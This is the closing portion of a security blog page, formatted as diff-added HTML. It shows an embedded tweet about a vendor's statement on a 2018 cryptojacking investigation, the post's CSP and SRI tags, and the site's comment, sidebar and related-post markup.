+<blockquote class="twitter-tweet tw-align-center" data-lang="en"><p lang="en" dir="ltr">Statement from <a href="https://twitter.com/texthelp?ref_src=twsrc%5Etfw&ref=scotthelme.co.uk">@texthelp</a> with an update on the investigation: <a href="https://t.co/p3oUmrb1MJ?utm_source=scotthelme.co.uk">https://t.co/p3oUmrb1MJ</a> <a href="https://t.co/QTNWb8SwQg?utm_source=scotthelme.co.uk">pic.twitter.com/QTNWb8SwQg</a></p>&mdash; Scott Helme (@Scott_Helme) <a href="https://twitter.com/Scott_Helme/status/963468235285893121?ref_src=twsrc%5Etfw&ref=scotthelme.co.uk">February 13, 2018</a></blockquote>
+<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
+<!--kg-card-end: markdown-->
+                    </div>
+					<br/>Have you enjoyed this post or found it helpful?
+					<br/>☕️ Consider <a href="https://donate.stripe.com/4gMeVd3xm0sOcRzexF93y00" target="_blank">buying me a coffee</a> to say thanks!
+					<br/>🔔 Subscribe for <a href="https://scotthelme.ghost.io/#/portal/signup" target="_blank">free notifications</a> when I publish!
+					<br/>🤩 Become a <a href="https://scotthelme.ghost.io/#/portal/signup" target="_blank">member</a> and support my content!
+					<br/><br/>
+		        <i class="fas fa-folder-open"></i>
+		        Tags: <a href="/tag/csp/">CSP</a>, <a href="/tag/sri/">SRI</a>, <a href="/tag/report-uri/">Report URI</a>, <a href="/tag/cryptojacking/">Cryptojacking</a>
+                    <section class="post-full-comments">
+                        <!-- start disqus comment -->
+<div id="post_id" data="5ad2388a6eb7640022c30146"></div>
+<br/>
+<div class="disqus-container">
+	<div id="disqus_thread"></div>
+	    <script src="/assets/js/comment.min.js?v=ydbbdOGxDN8peDZd" type="text/javascript" ></script>
+	    <script async src="https://scotthelme.disqus.com/embed.js" type="text/javascript"></script>
+	    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+<!-- end disqus comment -->                    </section>
+                </section>
+
+
+        </article>
+
+    </div>
+
+    <div class="site-sidebar">
+        <br/>
+
+<div id="upcoming-events">
+	<h2 class="post-card-title">Upcoming Events</h2>
+	<div>
+		<p>
+			<a href="https://ndcoslo.com/" class="event-title" rel="noopener" target="_blank">NDC Oslo (Oslo, Norway)</a>
+			<br/>14th - 18th September 2026
+		</p>
+	</div>
+	<div>
+		<p>
+			<a href="https://gotocph.com/2026/schedule?date=2026-09-28&video=false" class="event-title" rel="noopener" target="_blank">Hack Yourself First (Copenhagen, Denmark)</a>
+			<br/>28th - 29th September 2026
+		</p>
+	</div>
+	<div>
+		<p>
+			<a href="https://gotocph.com/2026" class="event-title" rel="noopener" target="_blank">GOTO Copenhagen (Copenhagen, Denmark)</a>
+			<br/>30th September - 2nd October 2026
+		</p>
+	</div>
+    <div>
+		<p>
+			<a href="https://bsides.london/" class="event-title" rel="noopener" target="_blank">BSides London (London, England)</a>
+			<br/>12th December 2026
+		</p>
+	</div>
+</div>
+
+<br/>
+
+<div id="cheat-sheets">
+	<h2 class="post-card-title">Cheat Sheets</h2>
+	<div>
+		<p><a href="https://scotthelme.co.uk/csp-cheat-sheet/" class="event-title">CSP Cheat Sheet</a>
+		<br/><a href="https://scotthelme.co.uk/hsts-cheat-sheet/" class="event-title">HSTS Cheat Sheet</a>
+		<br/><a href="https://scotthelme.co.uk/https-cheat-sheet/" class="event-title">HTTPS Cheat Sheet</a>
+		<br/><a href="https://scotthelme.co.uk/performance-cheat-sheet/" class="event-title">Performance Cheat Sheet</a></p>
+	</div>
+</div>
+
+<br/>
+
+<div id="projects">
+	<h2 class="post-card-title">Projects</h2>
+	<div>
+		<p><a href="https://report-uri.com" class="event-title" target="_blank" rel="noreferrer noopener">Report URI</a>
+		<br/><a href="https://securityheaders.com" class="event-title" target="_blank" rel="noreferrer noopener">Security Headers</a>
+		<br/><a href="https://whynopasskeys.com" class="event-title" target="_blank" rel="noreferrer noopener">Why No Passkeys?</a>
+		<br/><a href="https://whynohttps.com" class="event-title" target="_blank" rel="noreferrer noopener">Why No HTTPS?</a>
+		<br/><a href="https://crawler.ninja" class="event-title" target="_blank" rel="noreferrer noopener">Crawler.Ninja</a>
+		<br/><a href="http://httpforever.com/" class="event-title" target="_blank" rel="noreferrer noopener">HTTP Forever</a>
+		<br/><a href="/the-bmw-m140i-project-series/" class="event-title">BMW M140i</a></p>
+	</div>
+</div>
+
+<br/>
+
+<div id="social">
+	<h2 class="post-card-title">Follow</h2>
+	<div>
+		<ul class="social">
+			<li><a href="https://www.facebook.com/scott.helme" target="_blank" rel="noopener"><i class="fab fa-facebook"></i></a></li>
+			<li><a href="https://twitter.com/Scott_Helme" target="_blank" rel="noopener"><i class="fab fa-twitter"></i></a></li>
+			<li><a href="https://www.linkedin.com/in/scotthelme" target="_blank" rel="noopener"><i class="fab fa-linkedin"></i></a></li>
+			<li><a href="skype:scott.helme87?add" target="_blank" rel="noopener"><i class="fab fa-skype"></i></a></li>
+			<li><a href="https://uk.pinterest.com/scotthelme/" target="_blank" rel="noopener"><i class="fab  fa-pinterest"></i></a></li>
+			<li><a href="https://www.youtube.com/user/ScottHelme" target="_blank" rel="noopener"><i class="fab fa-youtube"></i></a></li>
+			<li><a href="https://vimeo.com/scotthelme" target="_blank" rel="noopener"><i class="fab fa-vimeo-square"></i></a></li>
+			<li><a href="https://www.flickr.com/photos/scotthelme/" target="_blank" rel="noopener"><i class="fab fa-flickr"></i></a></li>
+			<li><a href="https://www.tumblr.com/blog/scotthelme" target="_blank" rel="noopener"><i class="fab fa-tumblr"></i></a></li>
+			<li><a href="https://github.com/ScottHelme" target="_blank" rel="noopener"><i class="fab fa-github"></i></a></li>
+			<li><a href="https://www.instagram.com/scotthelme/" target="_blank" rel="noopener"><i class="fab fa-instagram"></i></a></li>
+			<li><a href="https://stackoverflow.com/users/1414715/scott-helme" target="_blank" rel="noopener"><i class="fab fa-stack-overflow"></i></a></li>
+			<li><a href="https://stackexchange.com/users/1513078/scott-helme" target="_blank" rel="noopener"><i class="fab fa-stack-exchange"></i></a></li>
+			<li><a href="bitcoin:1ScottkY3kbPi6fQEgAaGQoRfz4MxJLGZ" target="_blank" rel="noopener"><i class="fab fa-btc"></i></a></li>
+			<li><a href="https://www.paypal.me/scotthelme" target="_blank" rel="noopener"><i class="fab fa-paypal"></i></a></li>
+			<li><a href="mailto:scotthelme@hotmail.com" target="_blank" rel="noopener"><i class="fas fa-envelope"></i></a></li>
+			<li><a href="https://scotthelme.co.uk/rss/" target="_blank" rel="noopener"><i class="fas fa-rss"></i></a></li>
+		</ul>
+	</div>
+</div>
+
+
+<br/>
+
+<!--<div id="subscribe">
+	<h2 class="post-card-title">Subscribe</h2>
+	<div>
+		<p>Want to get notified when I publish a new blog post?</p>
+		<p><a class="button primary small header-cta" href="https://scotthelme.ghost.io/signup/">Subscribe</a></p>
+	</div>
+</div>-->
+
+    </div>
+
+</main>
+
+<aside class="read-next outer">
+    <div class="inner">
+        <div class="read-next-feed">
+                <article class="read-next-card">
+                    <header class="read-next-card-header">
+                        <h3><span>More in</span> <a href="/tag/csp/">CSP</a></h3>
+                    </header>
+                    <div class="read-next-card-content">
+                        <ul>
+                            <li>
+                                <h4><a href="/the-instructure-canvas-breach-2026-how-xss-in-a-support-ticket-compromised-275-million-students/">The Instructure Canvas Breach (2026): How XSS in a Support Ticket Compromised 275 Million Students</a></h4>
+                                <div class="read-next-card-meta">
+                                    <p><time datetime="2026-06-15">15 Jun 2026</time> –
+                                        13 min read</p>
+                                </div>
+                            </li>
+                            <li>
+                                <h4><a href="/security-considerations-when-using-passkeys-on-your-website/">Security considerations when using Passkeys on your website</a></h4>
+                                <div class="read-next-card-meta">
+                                    <p><time datetime="2026-04-22">22 Apr 2026</time> –
+                                        5 min read</p>
+                                </div>
+                            </li>
+                            <li>
+                                <h4><a href="/xss-ranked-1-top-threat-of-2025-by-mitre-and-cisa/">XSS Ranked #1 Top Threat of 2025 by MITRE and CISA</a></h4>
+                                <div class="read-next-card-meta">
+                                    <p><time datetime="2026-03-10">10 Mar 2026</time> –
+                                        2 min read</p>
+                                </div>
+                            </li>
+                        </ul>
+                    </div>
+                    <footer class="read-next-card-footer">
+                        <a href="/tag/csp/">See all 54 posts
+                            →</a>
+                    </footer>
+                </article>
+
+                <article class="post-card post tag-pki tag-symantec tag-chrome ">
+
+    <a class="post-card-image-link" href="/are-you-ready-for-the-symantec-distrust/">
+        <img class="post-card-image"
+            srcset="https://storage.ghost.io/c/ee/88/ee889f88-37ef-43e5-9180-f9b88ee6261d/content/images/size/w300/2018/02/symantec-1.png 300w,
+                    https://storage.ghost.io/c/ee/88/ee889f88-37ef-43e5-9180-f9b88ee6261d/content/images/size/w600/2018/02/symantec-1.png 600w,
+                    https://storage.ghost.io/c/ee/88/ee889f88-37ef-43e5-9180-f9b88ee6261d/content/images/size/w1200/2018/02/symantec-1.png 1000w,
+                    https://storage.ghost.io/c/ee/88/ee889f88-37ef-43e5-9180-f9b88ee6261d/content/images/size/w2000/2018/02/symantec-1.png 2000w"
+            sizes="(max-width: 1000px) 400px, 700px"
+            src="https://storage.ghost.io/c/ee/88/ee889f88-37ef-43e5-9180-f9b88ee6261d/content/images/size/w600/2018/02/symantec-1.png"
+            alt="Are you ready for the Symantec distrust?"
+        />
+    </a>
+
+    <div class="post-card-content">
+
+        <a class="post-card-content-link" href="/are-you-ready-for-the-symantec-distrust/">
+
+            <header class="post-card-header">
+                <div class="post-card-header-tags">
+                    <span class="post-visibility post-visibility-public">Free Post</span>
+                            <div class="post-card-primary-tag">PKI</div>
+
+                </div>
+                <h2 class="post-card-title">Are you ready for the Symantec distrust?</h2>
+            </header>
+
+            <section class="post-card-excerpt">
+                    <p>It&#39;s been common knowledge in the wider PKI community that Symantec, the
+Certificate Authority, is currently being distrusted and will soon cease to
+exist as a CA. My...</p>
+            </section>
+
+        </a>
+
+        <footer class="post-card-meta">
+            <ul class="author-list">
+                <li class="author-list-item">
+
+                    <div class="author-name-tooltip">
+                        Scott Helme
+                    </div>
+
+                    <a href="/author/scott/" class="static-avatar">
+                        <img class="author-profile-image" src="https://storage.ghost.io/c/ee/88/ee889f88-37ef-43e5-9180-f9b88ee6261d/content/images/size/w100/2023/07/profile-pic.jpg" alt="Scott Helme" />
+                    </a>
+                </li>
+            </ul>
+            <div class="post-card-byline-content">
+                <span><a href="/author/scott/">Scott Helme</a></span>
+                <span class="post-card-byline-date"><time datetime="2018-02-16">16 Feb 2018</time> <span class="bull">&bull;</span> 4 min read</span>
+            </div>
+        </footer>
+
+    </div>
+
+</article>
+
+                <article class="post-card post tag-report-uri tag-azure tag-table-storage tag-php ">
+
+    <a class="post-card-image-link" href="/hacking-table-storage-to-do-order-by-on-timestamp/">
+        <img class="post-card-image"
+            srcset="https://storage.ghost.io/c/ee/88/ee889f88-37ef-43e5-9180-f9b88ee6261d/content/images/size/w300/2018/02/microsoft-azure-new-logo-2017.png 300w,
+                    https://storage.ghost.io/c/ee/88/ee889f88-37ef-43e5-9180-f9b88ee6261d/content/images/size/w600/2018/02/microsoft-azure-new-logo-2017.png 600w,
+                    https://storage.ghost.io/c/ee/88/ee889f88-37ef-43e5-9180-f9b88ee6261d/content/images/size/w1200/2018/02/microsoft-azure-new-logo-2017.png 1000w,
+                    https://storage.ghost.io/c/ee/88/ee889f88-37ef-43e5-9180-f9b88ee6261d/content/images/size/w2000/2018/02/microsoft-azure-new-logo-2017.png 2000w"
+            sizes="(max-width: 1000px) 400px, 700px"
+            src="https://storage.ghost.io/c/ee/88/ee889f88-37ef-43e5-9180-f9b88ee6261d/content/images/size/w600/2018/02/microsoft-azure-new-logo-2017.png"
+            alt="Hacking Azure Table Storage to do ORDER BY on Timestamp"
+        />
+    </a>
+
+    <div class="post-card-content">
+
+        <a class="post-card-content-link" href="/hacking-table-storage-to-do-order-by-on-timestamp/">
+
+            <header class="post-card-header">
+                <div class="post-card-header-tags">
+                    <span class="post-visibility post-visibility-public">Free Post</span>
+                            <div class="post-card-primary-tag">Report URI</div>
+
+                </div>
+                <h2 class="post-card-title">Hacking Azure Table Storage to do ORDER BY on Timestamp</h2>
+            </header>
+
+            <section class="post-card-excerpt">
+                    <p>I recently wrote about a little hack we did with Azure Table Storage to give us
+functionality equivalent to a LIKE query in SQL, something not natively
+supported in Table...</p>
+            </section>
+
+        </a>
+
+        <footer class="post-card-meta">
+            <ul class="author-list">
+                <li class="author-list-item">
+
+                    <div class="author-name-tooltip">
+                        Scott Helme
+                    </div>
+
+                    <a href="/author/scott/" class="static-avatar">
+                        <img class="author-profile-image" src="https://storage.ghost.io/c/ee/88/ee889f88-37ef-43e5-9180-f9b88ee6261d/content/images/size/w100/2023/07/profile-pic.jpg" alt="Scott Helme" />
+                    </a>
+                </li>
+            </ul>
+            <div class="post-card-byline-content">
+                <span><a href="/author/scott/">Scott Helme</a></span>
+                <span class="post-card-byline-date"><time datetime="2018-02-05">5 Feb 2018</time> <span class="bull">&bull;</span> 5 min read</span>
+            </div>
+        </footer>
+
+    </div>
+
+</article>
+        </div>
+    </div>
+</aside>
+
+
+
+
+        <footer class="site-footer outer">
+            <div class="site-footer-content inner">
+                <section class="copyright">
+                   License&nbsp;<a href="https://creativecommons.org/licenses/by-sa/4.0/" target="_blank">CC BY-SA 4.0</a>&nbsp;to scotthelme.co.uk</a>
+                   <a href="https://www.facebook.com/scott.helme"><i class="fab fa-facebook"></i></a>
+		            <a href="https://twitter.com/Scott_Helme"><i class="fab fa-twitter"></i></a>
+		            <a href="https://github.com/ScottHelme"><i class="fab fa-github"></i></a>
+		            <a href="https://scotthelme.co.uk/rss/"><i class="fas fa-rss"></i></a>
+                </section>
+                <nav class="site-footer-nav">
+                    
+                </nav>
+            </div>
+        </footer>
+
+    </div>
+
+   <div class="notification notification-subscribe">
+    <a class="notification-close" href="javascript:;"></a>
+    Thanks for supporting me and my work!
+</div>
+
+<div class="notification notification-signup">
+    <a class="notification-close" href="javascript:;"></a>
+    Great, you're subscribed! Perhaps you'd also consider supporting my work?
+</div>
+
+<div class="notification notification-signin">
+    <a class="notification-close" href="javascript:;"></a>
+    Welcome back! You've successfully signed in.
+</div>
+
+<div class="notification notification-checkout">
+    <a class="notification-close" href="javascript:;"></a>
+    Wow! Thanks for the support!
+</div>
+
+<div class="notification notification-billing-update">
+    <a class="notification-close" href="javascript:;"></a>
+    Success! Your billing info is updated.
+</div>
+
+<div class="notification notification-billing-update-cancel">
+    <a class="notification-close" href="javascript:;"></a>
+    Billing info update failed.
+</div>
+    <script type="text/javascript" src="/assets/js/member.js?v=62OqhjxDoZxpn_63"></script>
+
+    <script src="/assets/js/removeNoReferrer.min.js"></script>
+
+</body>
+</html>
